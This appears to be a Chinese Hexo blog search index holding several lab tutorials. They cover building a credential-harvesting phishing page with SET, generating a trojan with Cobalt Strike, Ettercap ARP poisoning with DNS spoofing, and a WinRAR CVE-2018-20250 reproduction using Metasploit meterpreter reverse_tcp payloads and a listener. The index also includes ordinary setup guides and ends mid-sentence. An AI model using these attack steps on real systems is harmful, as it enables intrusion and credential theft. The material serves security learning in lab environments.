<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[在Windows server 2008 R2 上搭建VPN服务器]]></title>
    <url>%2FwinServer08R2-vpn%2F</url>
    <content type="text"><![CDATA[前言 搭建过程 一. 前言1. 什么是VPN虚拟专用网络(VPN)的功能是：在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。VPN有多种分类方式，主要是按协议进行分类。VPN可通过服务器、硬件、软件等多种方式实现。 二. 搭建过程1. Windows Server 搭建VPN服务器winserver- 打开服务器管理器，右击角色-添加角色 点击下一步，选择网络策略和访问服务 下一步，选择网络策略服务器和路由和远程访问服务 一路下一步完成安装 右击路由和远程访问，选择配置并启用路由和远程访问 下一步，选择自定义配置 下一步，选择VPN访问、NAT、LAN路由 下一步到最后，启动服务 进入路由和远程访问-IPv4，右击NAT，选择新增接口 选择本地连接 设置属性，勾选公用接口连接到Internet，并选择在此接口上启用NAT 接下来建立VPN访问用户，由于本机使用的是域环境，所以在Active Directory 域服务-Active Directory 用户和计算机-域名-User中创建用户，如果没有域环境在本机用户中创建即可 在中间空白处右击创建用户 创建完用户后记得更改用户属性 在属性中找到拨入选项卡，将网络访问权限改为允许访问 至此，Windows Server上的VPN服务器已经搭建完成，接下来去测试服务器是否能够正常连接 2. 使用Windows7连接测试在网络和共享中心里选择设置新的连接或网络 选择连接到工作区 选择使用我的Internet连接(VPN) 在Internet地址中输入VPN服务器的IP地址 输入刚才新建的用户 完成连接 从网络设置中可以看到，DNS服务器的地址是VPN服务器地址]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Windows server</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Social-Engineer-Toolkit生成钓鱼网站]]></title>
    <url>%2FSocial-engineer-toolkit%2F</url>
    <content type="text"><![CDATA[前言 工具使用 其他 一. 前言1. 钓鱼网站钓鱼网站通常指伪装成目标网站，窃取用户提交的帐号、密码等私密信息的网站。“钓鱼”是一种网络欺诈行为，指不法分子利用各种手段，仿冒真实网站的URL地址以及页面内容，或利用真实网站服务器程序上的漏洞在站点的某些网页中插入危险的HTML代码，以此来骗取用户银行或信用卡账号、密码等私人资料。 2. 社会工程学社会工程学（Social Engineering）在上世纪60年代左右作为正式的学科出现，广义社会工程学的定义是：建立理论并通过利用自然的、社会的和制度上的途径来逐步地解决各种复杂的社会问题。很多企业、公司在信息安全上投入大量的资金，最终导致数据泄露的原因，往往却是发生在人本身。你们可能永远都想象不到，对于黑客们来说，通过一个用户名、一串数字、一串英文代码，社会工程师就可以通过这么几条的线索，通过社工攻击手段，加以筛选、整理，就能把你的所有个人情况信息、家庭状况、兴趣爱好、婚姻状况、你在网上留下的一切痕迹等个人信息全部掌握得一清二楚。虽然这个可能是最不起眼，而且还是最麻烦的方法。一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。 3. Social-Engineering-ToolkitSocial Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。 二. 工具使用1. 生成钓鱼页面在kali Linux中，选择应用程序-Social Engineering Tools-Social-Engineering-Toolkit，打开程序 1) Social-Engineering Attacks(社工工程学攻击) 2) Penetration Testing (Fast-Track)（快速追踪测试） 3) Third Party Modules（第三模块） 4) Update the Social-Engineer Toolkit（升级） 5) Update SET configuration（升级配置） 6) Help, Credits, and About（帮助） 选择1)Social-Engineering Attacks，进入下一级菜单 1) Spear-Phishing Attack Vectors(鱼叉式网络钓鱼攻击) 2) Website Attack Vectors（网页攻击） 3) Infectious Media Generator（传染媒介产生器—木马） 4) Create a Payload and Listener（建立pay和监听器） 5) Mass Mailer Attack（邮件群发攻击） 6) Arduino-Based Attack Vector（基于Arduino攻击方式） 7) Wireless Access Point Attack Vector（无线接入攻击） 8) QRCode Generator Attack Vector（二维码攻击） 9) Powershell Attack Vectors（powershell攻击） 10) SMS Spoofing Attack Vector（SMS欺骗攻击） 11) Third Party Modules（第三模块） 选择2)Website Attack Vectors，进入下一级菜单 1) Java Applet Attack Method （java applet小程序攻击） 2) Metasploit Browser Exploit Method（MSF 浏览器攻击） 3) Credential Harvester Attack Method（钓鱼网站攻击） 4) Tabnabbing Attack Method（标签钓鱼攻击） 5) Web Jacking Attack Method（网站Jacking 攻击） 6) Multi-Attack Web Method（多站点攻击） 7) Full Screen Attack Method（全屏幕攻击） 8) HTA Attack Method（HTA攻击） 选择3) Credential Harvester Attack Method，进入下一级菜单 1) Web Templates (网站模板) 2) Site Cloner （网站克隆） 3) Custom Import （自定义） 选择1) Web Templates，进入下一级菜单 输入本机IP，进入下一级 选择2) Google，生成谷歌登录页面 按下回车，便开始监听 2. 测试钓鱼页面Social-Engineering-Toolkit生成完成钓鱼页面并开始监听后，我们从靶机访问钓鱼页面。 在输入完用户名密码后登录，Social-Engineering-Toolkit会显示收到的用户名和密码 三. 其他以上便是使用Social-Engineering-Toolkit生成钓鱼页面并获取用户信息的全过程。除了使用内置的网站模板外，还可以复制其他网站进行钓鱼。除此之外，我们可以配合Ettercap进行DNS欺骗，增加钓鱼网站的真实性。 本次实验为简单的测试，在实际使用中还需要考虑使用HTTPS协议、跨域访问等种种问题。 Social-Engineering-Toolkit还有许多更为强大的功能，需要慢慢学习。]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>Social-Engineer-Toolkit</tag>
        <tag>钓鱼网站</tag>
        <tag>社工</tag>
        <tag>kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Cobalt Strike生成Windows木马并攻击靶机的简单测试]]></title>
    <url>%2Fcobalt-strike%2F</url>
    <content type="text"><![CDATA[前言 攻击过程 后记 一. 前言1. 关于Cobalt StrikeCobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。而Cobalt Strike 3.0已经不再使用Metasploit框架而作为一个独立的平台使用，当然可以结合Armitage进行使用。 二. 攻击过程1. 攻击环境 攻击机：Windows7 ultimate sp1 IP：192.168.28.128 靶机：Windows7 ultimate sp1 IP：192.168.28.138 2. 攻击步骤2.1 开启TeamServer服务使用cmd命令行进入Cobalt Strike所在文件夹，使用如下命令开启TeamServer 1teamserver 本机IP 连接密码 #密码可以随意设置 接下来会提示服务已经建立服务，同时还会显示所使用的端口 2.2 使用客户端连接启动Cobalt Strike，填写相关信息，点击connect连接，进入主界面 2.3 生成病毒文件选择Attacks-&gt;Packages-&gt;Windows Executable 设置listener和输出的病毒文件格式 点击Generate生成，选择保存的位置 2.4 投放病毒把病毒放入靶机，并运行。我们可以通过Cobalt Strike发现靶机已经上线，同时可以进行多种操作 三. 后记以上就是使用Cobalt Strike进行简单攻击模拟的全过程。可以看到，关于工具本身使用非常简单,纯图形化操作,稍微有点儿基础,很快就能上手,而且它直接支持图标灵活拖拽很方便对指定肉鸡进行集中批量操作,非常友好。当然，在实际运用过程肯定在测试环境中要复杂的多，但毫无疑问作为一款工具，Cobalt Strike足够优秀。]]></content>
      <categories>
        <category>攻击测试</category>
      </categories>
      <tags>
        <tag>攻击测试</tag>
        <tag>Cobalt Strike</tag>
        <tag>木马攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Shellinabox在浏览器进行ssh登录]]></title>
    <url>%2FShellinabox%2F</url>
    <content type="text"><![CDATA[Shellinabox介绍 Shellinabox安装 使用Ngrok将服务映射到外网 一. Shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用http://IP:4200来登录到系统，在启用了SSL/TLS证书，需要用https://IP:4200来登录。默认情况下Shellinabox使用的是4200端口。 二. Shellinabox安装1. 更新软件源使用的是系统是Kali Linux 2019，在终端输入 1root@kali:~# install shellinabox 如果提示无法找到包，请添加国内更新源 12345678910root@kali:~# vi /etc/apt/sources.list//添加下列更新源#国科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 2. Shellinabox参数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859List of command line options: -b, --background[=PIDFILE] run in background -c, --cert=CERTDIR set certificate dir (default: $PWD) --cert-fd=FD set certificate file from fd --css=FILE attach contents to CSS style sheet --cgi[=PORTMIN-PORTMAX] run as CGI -d, --debug enable debug mode -f, --static-file=URL:FILE serve static file from URL path -g, --group=GID switch to this group (default: nogroup) -h, --help print this message --linkify=[none|normal|aggressive] default is &quot;normal&quot; --localhost-only only listen on 127.0.0.1 --no-beep suppress all audio output -n, --numeric do not resolve hostnames -m, --messages-origin=ORIGIN allow iframe message passing from origin --pidfile=PIDFILE publish pid of daemon process -p, --port=PORT select a port (default: 4200) -s, --service=SERVICE define one or more services -t, --disable-ssl disable transparent SSL support --disable-ssl-menu disallow changing transport mode --disable-utmp-logging disable logging to utmp and wtmp -q, --quiet turn off all messages --unixdomain-only=PATH:USER:GROUP:CHMOD listen on unix socket -u, --user=UID switch to this user (default: nobody) --user-css=STYLES defines user-selectable CSS options -v, --verbose enable logging messages --version prints version information --disable-peer-check disable peer check on a sessionDebug, quiet, and verbose are mutually exclusive.One or more --service arguments define services that should be made availablethrough the web interface: SERVICE := &lt;url-path&gt; &apos;:&apos; APP APP := &apos;LOGIN&apos; | &apos;SSH&apos; [ : &lt;host&gt; ] | USER &apos;:&apos; CWD &apos;:&apos; CMD USER := &apos;AUTH&apos; | &lt;username&gt; &apos;:&apos; &lt;groupname&gt; CWD := &apos;HOME&apos; | &lt;dir&gt; CMD := &apos;SHELL&apos; | &lt;cmdline&gt;&lt;cmdline&gt; supports variable expansion: $&#123;columns&#125; - number of columns $&#123;gid&#125; - gid id $&#123;group&#125; - group name $&#123;home&#125; - home directory $&#123;lines&#125; - number of rows $&#123;peer&#125; - name of remote peer $&#123;realip&#125; - value of HTTP header field &apos;X-Real-IP&apos; $&#123;uid&#125; - user id $&#123;url&#125; - the URL that serves the terminal session $&#123;user&#125; - user nameOne or more --user-css arguments define optional user-selectable CSS options.These options show up in the right-click context menu: STYLES := GROUP &#123; &apos;;&apos; GROUP &#125;* GROUP := OPTION &#123; &apos;,&apos; OPTION &#125;* OPTION := &lt;label&gt; &apos;:&apos; [ &apos;-&apos; | &apos;+&apos; ] &lt;css-file&gt;OPTIONs that make up a GROUP are mutually exclusive. But individual GROUPs areindependent of each other. 12345678-b 后台运行-c, --cert=CERTDIR 指定证书目录（默认当前工作路径）-p, --port=PORT 更改端口 (默认: 4200)-t, --disable-ssl 关闭SSL传输-q, --quiet 安静模式，禁用所有信息-u, --user=UID 设置登录用户 (默认: nobody)-v, --verbose 开启登录信息提示--version 显示版本信息 3. Shellinabox启动1root@kali:~# shellinaboxd -b -t 启动服务之后，在浏览器访问http://IP:4200，默认4200端口，可以自己修改 Shellinabox默认禁止root登陆，所以Kali系统需要新建一个用户登录 三. 使用Ngrok将服务映射到外网1. 建立隧道在Ngrok建立隧道，注意本地端口填写启动Shellinabox的端口 2.开启映射开启映射之前需要先下载客户端 1root@kali:~/linux_amd64# wget https://www.ngrok.cc/sunny/linux_amd64.zip 将下载完成后，解压并开启 123root@kali:~# unzip linux_amd64.ziproot@kali:~# cd /Desktop/linux_amd64root@kali:~# ./sunny clientid 隧道id 3. 通过外网登陆直接输入URL即可登录]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>kali Linux</tag>
        <tag>环境搭建</tag>
        <tag>Shellinabox</tag>
        <tag>Ngrok</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Ettercap实现DNS欺骗的简单测试]]></title>
    <url>%2Fettercap-DNS%E6%AC%BA%E9%AA%97%2F</url>
    <content type="text"><![CDATA[前言 攻击过程 其他 一. 前言1. 什么是中间人攻击中间人攻击（Man-in-the-middle attack，缩写：MITM）是指攻击者与通讯的两端分别建立独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。 一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。 2. DNS欺骗DNS欺骗攻击是一种非常危险的中间人攻击，它容易被攻击者利用并且窃取用户的机密信息。虽然这篇文章可以提供一些新的见解，但重要的是DNS欺骗是一个一般概念，有无数种方法可以实现一个DNS欺骗攻击。在一个DNS欺骗攻击中，攻击者可以利用一个漏洞来伪造网络流量。因此，要理解DNS欺骗攻击，必须理解DNS是怎样工作的。 DNS(域名系统)在互联网中是一个非常重要的协议。它属于TCP/IP，是一个分层结构的分布式模块，它包含域名的相关信息。它负责在网络上映射域名到他们各自的IP上。DNS定位主机/服务器通过查看友好域名，使用域名系统，DNS将域名和IP地址相互映射 。这些设备（路由器、服务器等）连接到你的电脑不能理解一些友好的名称 （infosecinstitute.com）,他们只了解一个IP地址，而DNS负责翻译它。 让我们来看看下面这个图来理解主机和本地DNS服务器的正常通信。 DNS服务器包含着一个主数据库，其中包括信息的IP地址，因为这涉及到相应的域名。所以在这些正常的通信中，一个主机发送请求到服务器，之后服务器响应正确的信息。如果DNS没有信息传入的请求，它将发送请求到外部DNS服务器来获取正确的响应。那么攻击者如何使用中间人攻击来实施DNS欺骗呢？下图说明了答案： 使用DNS欺骗中间人攻击，攻击者将截取会话，然后转移到一个假网站的会话。假如：用户希望访问google.com，并且谷歌的IP地址为173.194.35.37，攻击者就可以使用DNS欺骗技术拦截会话，并将用户重定向到假冒的网站，假网站IP可以为任意IP。 3. Ettercap介绍Ettercap是一个综合套件，适合中间人攻击。它具有实时连接嗅探、动态内容过滤等功能，支持对许多协议的主动和被动解析，并包含许多用于网络和主机分析的功能。 二. 攻击过程1. 攻击环境 攻击机：kali linux 2019.1 IP：192.168.28.136 靶机：Windows7 ultimate sp1 IP：192.168.28.138 2. 攻击步骤2.1 开启本地web服务器在kali Linux系统中开启Apache服务 12root@kali:~# service apache2 start #开启apache服务root@kali:~# service apache2 status #查看apache状态 在web服务器中添加页面 123root@kali:~# cd /var/www/html/root@kali:/var/www/html# mv index.html index.html.bak root@kali:/var/www/html# vi index.html 在文件中输入如下内容 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;This is a test page&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt; 这是一个测试页面 &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 2.2 修改etter.dns1root@kali:~# vi /etc/ettercap/etter.dns 在文件中添加 12www.*.com A 192.168.28.136www.*.com PTR 192.168.28.136 2.3 设置Etterap使用命令ettercap -G来进入ettercap的图形界面。 选择网卡Unfied sniffing 网卡选择eth0（根据自己的计算机网卡而定） 2.4 扫描主机扫描网关下的所以在线的计算机主机，来到hosts选项下的scan for hosts 点击Hosts list列出扫到的主机 2.5 选择攻击目标在列表里选择网关进行添加，我这里的网关是192.168.28.2。选中之后点击Add to target 1 选中IP为192.168.28.138的靶机，点击Add to target 2 2.6 进行攻击配置好后在继续点击mitm&gt;arp poisoning 勾选Sniff remote connections 选择插件plugins&gt;mangge the plugins 我们要进行的是DNS欺骗，双击dns_spoof可以看见下边的提示 最后点击strat&gt;start sniffing开始DNS欺骗 2.7 查看攻击效果在靶机上使用浏览器，输入http://www.baidu.com，会显示到我们设置的页面 三. 其他以上就是使用Ettercap实现DNS欺骗的简单测试 DNS欺骗是一种非常危险的攻击，因为攻击者可以利用ettercap的dns_spoof插件和其他工具执行攻击。最终，攻击者可以使用一个社会工程工具包来执行攻击去控制受害者的电脑。想象一下这是多少容易，通过社会工程工具包和DNS欺骗技术你所需要做得就是配置你的社会工程工具包和你的IP清单，制作像谷歌一样的网站欺骗域名到你的IP地址上。当受害者打开google，你的攻击将使它访问你的IP，之后建立一个远程的会话。 参考：https://www.freebuf.com/articles/system/5265.html]]></content>
      <categories>
        <category>攻击测试</category>
      </categories>
      <tags>
        <tag>kali Linux</tag>
        <tag>攻击测试</tag>
        <tag>Ettercap</tag>
        <tag>中间人攻击</tag>
        <tag>DNS欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA渗透测试平台搭建]]></title>
    <url>%2Finstall-DVWA%2F</url>
    <content type="text"><![CDATA[关于DVWA 在Windows系统中搭建DVWA 在Linux系统中搭建DVWA 其他 一. 关于DVWADVWA(Damn Vulnerable Web Application)是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。 DVWA的目标是通过简单直接的界面练习一些最常见的Web漏洞，具有各种难度。请注意，此软件存在记录和未记录的漏洞。 DVWA共有十个模块，分别是: Brute Force（暴力（破解） Command Injection（命令行注入） CSRF（跨站请求伪造） File Inclusion（文件包含） File Upload（文件上传） Insecure CAPTCHA （不安全的验证码） SQL Injection（SQL注入） SQL Injection（Blind）（SQL盲注） XSS（Reflected）（反射型跨站脚本） XSS（Stored）（存储型跨站脚本） 同时每个模块的代码都有4种安全等级：Low、Medium、High、Impossible。通过从低难度到高难度的测试并参考代码变化可帮助学习者更快的理解漏洞的原理。 二. 在Windows系统中搭建DVWA1.下载DVWA从https://github.com/ethicalhack3r/DVWA下载zip包或使用git命令直接下载 2. 将DVWA放入本地站点目录中本人的Windows系统中使用phpstudy搭建web服务器 将解压出来的文件放入phpStudy\PHPTutorial\WWW目录下 3. 安装DVWA3.1 修改配置文件打开\DVWA-master\config目录下的config.inc.php文件 修改以下字段 12345$_DVWA = array();$_DVWA[ 'db_server' ] = '127.0.0.1';$_DVWA[ 'db_database' ] = 'dvwa';$_DVWA[ 'db_user' ] = 'root';$_DVWA[ 'db_password' ] = 'root用户密码'; 3.2 安装DVWA打开浏览器，输入http://127.0.0.1/DVWA-master/index.php进入，选择左侧的Setup/Reset DB选项，在最下方点击Create/Reset Database，如果提示Setup successful!即安装成功 3.3 登录DVWA使用浏览器访问http://127.0.0.1/DVWA-master/，输入用户名admin，密码password即可登录 三. 在Linux系统中搭建DVWA在Linux系统中搭建DVWA的过程和Windows系统中基本一致 1.下载DVWA12root@ubuntu:~# cd /var/www/htmlroot@ubuntu:/var/www/html# git clone https://github.com/ethicalhack3r/DVWA 2.修改配置文件123root@ubuntu:/var/www/html# cd DVWA/config/root@ubuntu:/var/www/html/DVWA/config# mv config.inc.php.dist config.inc.phproot@ubuntu:/var/www/html/DVWA/config# vi config.inc.php 修改config.inc.php文件的内容，同Windows系统 3. 安装DVWA在浏览器内输入127.0.0.1/DVWA，进入DVWA安装页面，拉到最下面，点击Create/Reset Database，如果提示Setup successful!即完成安装 此时会跳转到登录页面，输入账号密码即可登录 四. 其他以上便是DVWA在两种操作系统上部署的全过程，仅供参考和学习]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04安装lamp环境]]></title>
    <url>%2Fubuntu16-04-lamp%2F</url>
    <content type="text"><![CDATA[什么是lamp环境 Ubuntu16.04安装lamp环境 其他 一. 什么是lamp环境LAMP是指一组通常一起使用来运行动态网站或者服务器的自由软件名称首字母缩写： Linux，操作系统 Apache，网页服务器 MariaDB或MySQL，数据库管理系统（或者数据库服务器） PHP、Perl或Python，脚本语言 二. Ubuntu16.04安装lamp环境1. 添加软件源1.1 查找国内镜像源本文使用清华大学开源软件镜像站所提供的Ubuntu镜像源 12345678910111213# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# 预发布软件源，不建议启用# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse 1.2 配置source listsources.list系统自带的，源是来Ubuntu的官网！安装包比较慢，所以最好切换成国内的 123root@ubuntu:~$ cd /etc/aptroot@ubuntu:/etc/apt$ sudo cp sources.list sources.list.bakroot@ubuntu:/etc/apt$ vim sources.list 将国内镜像源的内容复制进去 1.4 更新源1root@ubuntu:/etc/apt$ sudo apt-get update 1.5 其他命令12345678910111213141516sudo apt-get update 更新源sudo apt-get install package 安装包sudo apt-get remove package 删除包sudo apt-cache search package 搜索软件包sudo apt-cache show package 获取包的相关信息，如说明、大小、版本等sudo apt-get install package --reinstall 重新安装包sudo apt-get -f install 修复安装sudo apt-get remove package --purge 删除包，包括配置文件等sudo apt-get build-dep package 安装相关的编译环境sudo apt-get upgrade 更新已安装的包sudo apt-get dist-upgrade 升级系统sudo apt-cache depends package 了解使用该包依赖那些包sudo apt-cache rdepends package 查看该包被哪些包依赖sudo apt-get source package 下载该包的源代码sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包sudo apt-get check 检查是否有损坏的依赖 2. 安装Apache2 web 服务器1sudo apt install apache2 -y 检查是否开启Apache 1systemctl status apache2 开启、关闭和重启服务器 123/etc/init.d/apache2 start/etc/init.d/apache2 stop/etc/init.d/apache2 restart 访问你的 web 服务器，打开浏览器并输入服务器的IP地址或者主机名 3. 安装MySQL数据库1sudo apt install mysql-server mysql-client 在安装过程中会要求设置root用户密码 确认安装成功 1sudo netstat -ano | grep 3306 4. 安装PHP脚本语音1sudo apt install php7.0-mysql php7.0-curl php7.0-json php7.0-cgi php7.0 libapache2-mod-php7.0 查看PHP版本 1php --version 查看phpinfo 1vi /var/www/html/phpinfo.php 在phpinfo.php文件内写入如下内容 123&lt;?php echo phpinfo();?&gt; 从浏览器中访问这个页面, 输入http://127.0.0.1/phpinfo.php，可以看到如下页面。 5. 安装phpmyadmin123sudo apt install php-mbstring php7.0-mbstring php-gettextsudo systemctl restart apache2.servicesudo apt install phpmyadmin 安装完成后，在浏览器中访问http://127.0.0.1/phpmyadmin，即可进入phpmyadmin 如果在浏览器中无法打开phpmyadmin，需要将/usr/share/phpmyadmin/链接到/var/www/html/目录下 1ln -s /usr/share/phpmyadmin/ /var/www/html/ 三. 其他以上便是Ubuntu16.04安装lamp环境的全过程，本地的网络服务器已经搭建成功]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>ubuntu</tag>
        <tag>lamp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用gittalk实现hexo博客评论功能]]></title>
    <url>%2Fgitalk%2F</url>
    <content type="text"><![CDATA[关于gitalk 使用gitalk实现hexo博客评论功能 其他 关于gitalkGitalk 是一个基于 GitHub Issue 和 Preact 开发的评论插件。 特性 使用GitHub登录 支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru] 支持个人或组织 无干扰模式（设置 distractionFreeMode 为 true 开启） 快捷键提交评论 （cmd|ctrl + enter） gitalk实现hexo博客评论功能Register Application在GitHub上注册新应用，链接：https://github.com/settings/applications/new 参数说明： Application name： # 应用名称，随意 Homepage URL： # 网站URL Application description # 描述，随意 Authorization callback URL：# 网站URL 点击注册后，页面跳转如下，其中Client ID和Client Secret在后面的配置中需要用到，到时复制粘贴即可： 新建gitalk.swig在主题文件夹下新建/layout/_third-party/comments/gitalk.swig文件，并添加内容： 1234567891011121314151617&#123;% if page.comments &amp;&amp; theme.gitalk.enable %&#125; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/gitalk/dist/gitalk.css&quot;&gt; &lt;script src=&quot;https://unpkg.com/gitalk/dist/gitalk.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; var gitalk = new Gitalk(&#123; clientID: &apos;&#123;&#123; theme.gitalk.ClientID &#125;&#125;&apos;, clientSecret: &apos;&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;&apos;, repo: &apos;&#123;&#123; theme.gitalk.repo &#125;&#125;&apos;, owner: &apos;&#123;&#123; theme.gitalk.githubID &#125;&#125;&apos;, admin: [&apos;&#123;&#123; theme.gitalk.adminUser &#125;&#125;&apos;], id: location.pathname, distractionFreeMode: &apos;&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;&apos; &#125;) gitalk.render(&apos;gitalk-container&apos;) &lt;/script&gt;&#123;% endif %&#125; 修改comments.swig修改主题文件夹内/layout/_partials/comments.swig，添加内容如下，与前面的elseif同一级别上： 12&#123;% elseif theme.gitalk.enable %&#125; &lt;div id=&quot;gitalk-container&quot;&gt;&lt;/div&gt; 修改index.swig修改layout/_third-party/comments/index.swig，在最后一行添加内容： 1&#123;% include &apos;gitalk.swig&apos; %&#125; 新建gitalk.styl新建/source/css/_common/components/third-party/gitalk.styl文件，添加内容： 1234.gt-header a, .gt-comments a, .gt-popup a border-bottom: none;.gt-container .gt-popup .gt-action.is--active:before top: 0.7em; 修改third-party.styl修改/source/css/_common/components/third-party/third-party.styl，在最后一行上添加内容，引入样式： 1@import &quot;gitalk&quot;; 修改_config.yml在主题配置文件next/_config.yml中添加如下内容： 12345678gitalk: enable: true githubID: github帐号 repo: 仓库名称 ClientID: Client ID ClientSecret: Client Secret adminUser: github帐号 #指定可初始化评论账户 distractionFreeMode: true 其他以上就是NexT中添加gitalk评论的配置，博客上传到GitHub上后，打开页面进入某一博客内容下，就可看到评论处。 参考文章 https://asdfv1929.github.io/2018/01/20/gitalk/ https://liujunzhou.top/2018/8/10/gitalk-error/]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>Hexo</tag>
        <tag>gitalk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-20250（WinRAR目录穿越漏洞）复现]]></title>
    <url>%2Fwinrar-CVE-2018-20250%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言 复现准备 复现过程 后记 一.前言2月下旬，著名压缩软件WinRAR被曝高危漏洞，全球已有超过5亿用户受到影响。该漏洞一旦被黑客利用，黑客就能将恶意程序植入使用者电脑的开机程序中，该漏洞在2005年便已经存在。 本文在虚拟环境中，使用Metasploit对漏洞攻击进行复现，展示其攻击过程，供大家学习和参考。 二.复现准备1.漏洞描述该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。该动态链接库的作用是处理 ACE 格式文件。而在解压处理过程中存在一处目录穿越漏洞,允许解压过程写入文件至开机启动项，导致代码执行。 2.漏洞影响 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.复现环境虚拟环境搭建：VMware Workstation 15 pro 网络模式：NAT 攻击机：kali Linux 2019.1 IP:192.168.28.136 靶机：Windows 7 ultimate sp1 x64 IP:192.168.28.128 三.复现过程1.使用Metasploit5生成免杀Payload在kali Linux中输入msfconsole命令启动Metasploit 在Metasploit中依次输入 1234use evasion/windows/windows_defender_exeshow infoset filename WinRAR.exeset payload windows/meterpreter/reverse_tcp 输入show options查看配置 使用如下命令修改配置 12set lhost 192.168.28.136set lport 12345 修改完成后输入run运行，提示生成如下文件 2.使用exp生成恶意文件exp下载：https://github.com/WyAtu/CVE-2018-20250/ 2.1修改exp.py文件将exp.py中的evil_filename“的值改为&quot;WinRAR.exe&quot;，将target_filename的值改为&quot;.\hi.exe&quot; 2.2生成恶意文件将刚才使用Metasploit生成的WinRAR.exe文件复制到下载的exp文件夹内，使用python exp.py命令生成恶意程序test.rar 值得注意的是，执行此命令需要python3以上的环境，另外如果在Linux系统中执行不成功可以尝试使用Windows系统来执行 3.在kali Linux中使用Metasploit监听靶机在Linux终端中运行如下命令 1234567msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.28.128set lport 12345run 4.在靶机上运行恶意程序将test.rar文件放入靶机，解压该文件，解压后会生成如下文件 双击执行hi.exe文件，此时kali 